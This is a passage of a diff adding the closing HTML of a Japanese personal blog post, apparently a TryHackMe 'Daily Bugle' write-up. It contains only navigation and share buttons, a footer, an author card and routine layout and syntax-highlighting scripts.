+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#table-of-contents">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+            
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2020 しろくま. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+        <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://divergen371.github.io/2020/11/hackthebox-impossible_password/" data-tooltip="HackTheBox: Impossible_Password">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://divergen371.github.io/2020/11/tryhackme-daily-bugle/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+      
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#table-of-contents">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="5">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fdivergen371.github.io%2F2020%2F11%2Ftryhackme-daily-bugle%2F">
+          <i class="fa fa-twitter"></i><span>Share on Twitter</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://res.cloudinary.com/dtzr5zvpc/image/upload/w_1000,c_fill,ar_1:1,g_auto,r_max,b_rgb:262c35/v1594735710/MyTechBlog/hans-jurgen-mager-AZ31hv9kdzE-unsplash_k0hkjm.jpg" alt="Author&#39;s picture" />
+    
+    <h4 id="about-card-name">しろくま</h4>
+    
+      <div id="about-card-bio">エンジニアワナビのフリーター。  セキュリティ・インフラ・Web制作・CTFに興味を持っています。</div>
+    
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        Japan
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    <div id="cover" style="background-image:url('https://res.cloudinary.com/dtzr5zvpc/image/upload/v1594722855/MyTechBlog/jr-korpa-mDvtYjZR8QI-unsplash_pjjiv2.jpg');"></div>
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="https://divergen371.github.io/js/script-pcw6v3xilnxydl1vddzazdverrnn9ctynvnxgwho987mfyqkuylcb1nlt.min.js"></script>
+
+
+<script lang="javascript">
+window.onload = updateMinWidth;
+window.onresize = updateMinWidth;
+document.getElementById("sidebar").addEventListener("transitionend", updateMinWidth);
+function updateMinWidth() {
+  var sidebar = document.getElementById("sidebar");
+  var main = document.getElementById("main");
+  main.style.minWidth = "";
+  var w1 = getComputedStyle(main).getPropertyValue("min-width");
+  var w2 = getComputedStyle(sidebar).getPropertyValue("width");
+  var w3 = getComputedStyle(sidebar).getPropertyValue("left");
+  main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
+}
+</script>
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+  
+    
+  
+
+
+
+
+    
+  </body>
+</html>
+
